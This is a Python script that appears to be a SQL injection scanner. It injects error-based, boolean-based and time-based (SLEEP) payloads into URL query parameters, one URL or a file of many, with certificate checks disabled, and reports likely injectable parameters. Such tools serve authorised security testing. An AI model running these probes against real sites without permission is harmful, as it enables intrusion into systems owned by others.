#!/usr/bin/env python3

import requests
import time
import urllib.parse

TIMEOUT = 10

# Boolean-based payloads
BOOLEAN_PAYLOADS = [
    "' AND 1=1 --",
    "' AND 1=2 --",
    "\" AND 1=1 --",
    "\" AND 1=2 --",
    "') AND 1=1 --",
    "') AND 1=2 --",
    "\") AND 1=1 --",
    "\") AND 1=2 --"
]

# Time-based payloads
TIME_PAYLOADS = [
    "' AND SLEEP(5) --",
    "\" AND SLEEP(5) --",
    "') AND SLEEP(5) --",
    "\") AND SLEEP(5) --",
    "' AND (SELECT * FROM (SELECT(SLEEP(5)))a) --",
    "\" AND (SELECT * FROM (SELECT(SLEEP(5)))a) --"
]

# Error-based payloads
ERROR_PAYLOADS = [
    "'",
    "\"",
    "')",
    "\")",
    "''",
    "\"\"",
    "'''",
    "\"\"\""
]


def replace_param(url, param, payload):
    """Replace parameter value in URL with payload"""
    parsed = urllib.parse.urlparse(url)
    query_params = urllib.parse.parse_qs(parsed.query)

    if param in query_params:
        query_params[param] = [payload]
    else:
        return url

    new_query = urllib.parse.urlencode(query_params, doseq=True)
    new_url = urllib.parse.urlunparse((
        parsed.scheme,
        parsed.netloc,
        parsed.path,
        parsed.params,
        new_query,
        parsed.fragment
    ))

    return new_url


def run_sqli_scan_single(url):
    """Scan a single URL for SQL injection vulnerabilities"""
    if "=" not in url:
        print("[-] No parameters found in URL")
        return

    session = requests.Session()
    parsed = urllib.parse.urlparse(url)
    query_params = urllib.parse.parse_qs(parsed.query)
    params = list(query_params.keys())

    print(f"[*] Testing {len(params)} parameter(s): {', '.join(params)}")

    for param in params:
        print(f"\n[*] Testing parameter: {param}")

        # ----------------------------------------------------
        # ERROR-BASED
        # ----------------------------------------------------

        for payload in ERROR_PAYLOADS:
            try:
                target = replace_param(url, param, payload)
                r = session.get(target, timeout=TIMEOUT, verify=False)

                if any(error in r.text.lower() for error in [
                    "sql syntax", "mysql", "postgresql", "oracle",
                    "microsoft sql", "sqlite", "syntax error",
                    "unclosed quotation", "you have an error"
                ]):
                    print(f"[!] Possible ERROR SQLi -> {param} (payload: {payload})")

            except:
                pass

        # ----------------------------------------------------
        # BOOLEAN-BASED
        # ----------------------------------------------------

        for i in range(0, len(BOOLEAN_PAYLOADS), 2):
            true_payload = BOOLEAN_PAYLOADS[i]
            false_payload = BOOLEAN_PAYLOADS[i + 1] if i + 1 < len(BOOLEAN_PAYLOADS) else BOOLEAN_PAYLOADS[i]

            try:
                true_url = replace_param(url, param, true_payload)
                false_url = replace_param(url, param, false_payload)

                r_true = session.get(
                    true_url,
                    timeout=TIMEOUT,
                    verify=False
                )

                r_false = session.get(
                    false_url,
                    timeout=TIMEOUT,
                    verify=False
                )

                if (
                    r_true.status_code == r_false.status_code
                    and len(r_true.text) != len(r_false.text)
                ):
                    print(f"[!] Possible BOOLEAN SQLi -> {param}")

            except:
                pass

        # ----------------------------------------------------
        # TIME-BASED
        # ----------------------------------------------------

        for payload in TIME_PAYLOADS:
            try:
                target = replace_param(url, param, payload)

                start = time.time()

                session.get(
                    target,
                    timeout=TIMEOUT,
                    verify=False
                )

                elapsed = time.time() - start

                if elapsed >= 5:
                    print(f"[!] Possible TIME SQLi -> {param}")

            except:
                pass


# ============================================================
# FILE MODE
# ============================================================


def run_sqli_scan_file(input_file):
    try:
        with open(input_file, "r") as f:
            urls = [u.strip() for u in f if u.strip()]

        for url in urls:
            if "=" not in url:
                continue

            print(f"\n[URL] {url}")
            run_sqli_scan_single(url)

    except Exception as e:
        print(f"[ERROR] {e}")